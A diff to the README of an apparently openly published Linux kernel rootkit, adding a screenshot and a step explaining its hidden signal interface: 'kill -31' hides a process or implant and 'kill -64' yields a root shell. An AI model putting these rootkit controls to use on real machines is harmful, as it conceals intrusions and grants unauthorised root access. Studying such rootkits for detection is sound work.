@@ -57,7 +57,9 @@ $ cd kernel_src/
 $ make
 $ sudo insmod reveng_rtkit.ko
 ```
-4. To interract with it. Open another terminal
+![kernel_rootkit](https://user-images.githubusercontent.com/61424547/155671527-7bfb2487-e380-4812-b342-b0cb5c59cb11.png)
+
+4. To interract with the kernel rootkit. Open another terminal
 ```
 $ cd reveng_rtkit/user_src/
 ```
@@ -69,3 +71,13 @@ $ sudo ./client_usermode
 #### NOTE: Be sure to run the code with root priv., because we are interracting with device driver, which is a part of the Linux kernel.
 
 ![client_mode](https://user-images.githubusercontent.com/61424547/155657382-f7604f49-6f42-4927-ab1d-deef37ff519f.png)
+
+6. Another method to interract with it is via kill syscall interception:
+To hide process/implant:
+```
+$ kill -31 <pid>
+```
+To get root shell:
+```
+$ kill -64 <any pid>
+```
